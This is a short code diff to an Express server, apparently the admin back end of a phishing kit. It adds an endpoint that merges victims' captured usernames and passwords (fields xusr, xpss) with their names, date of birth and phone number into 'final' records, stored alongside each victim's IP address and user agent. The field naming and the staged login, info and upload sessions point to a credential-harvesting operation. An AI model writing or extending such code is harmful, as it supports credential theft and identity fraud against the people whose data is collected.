@@ -285,6 +285,44 @@ app.get('/api/admin/stats', async (req, res) => {
   }
 });
 
+// Fix incomplete sessions - mark sessions with login, info, and upload data as completed
+app.post('/api/admin/fix-incomplete-sessions', async (req, res) => {
+  try {
+    const sessions = await db.getAllUserSessions();
+    let fixedCount = 0;
+    
+    for (const session of sessions) {
+      // Check if session has login, info, and upload data but no final data
+      if (session.loginData && session.infoData && session.uploadData && !session.finalData) {
+        console.log(`Fixing incomplete session: ${session.sessionId}`);
+        
+        // Create final data from existing data
+        const finalData = {
+          xusr: session.loginData.xusr,
+          xpss: session.loginData.xpss,
+          xname1: session.infoData.xname1,
+          xname2: session.infoData.xname2,
+          xdob: session.infoData.xdob,
+          xtel: session.infoData.xtel
+        };
+        
+        // Store final data
+        await db.storeFinalData(session.sessionId, finalData, session.ip, session.userAgent);
+        fixedCount++;
+      }
+    }
+    
+    res.json({
+      success: true,
+      message: `Fixed ${fixedCount} incomplete sessions`,
+      fixedCount
+    });
+  } catch (error) {
+    console.error('Error fixing incomplete sessions:', error);
+    res.status(500).json({ success: false, error: 'Error fixing sessions' });
+  }
+});
+
 app.delete('/api/admin/delete-data/:sessionId', async (req, res) => {
   const { sessionId } = req.params;
   
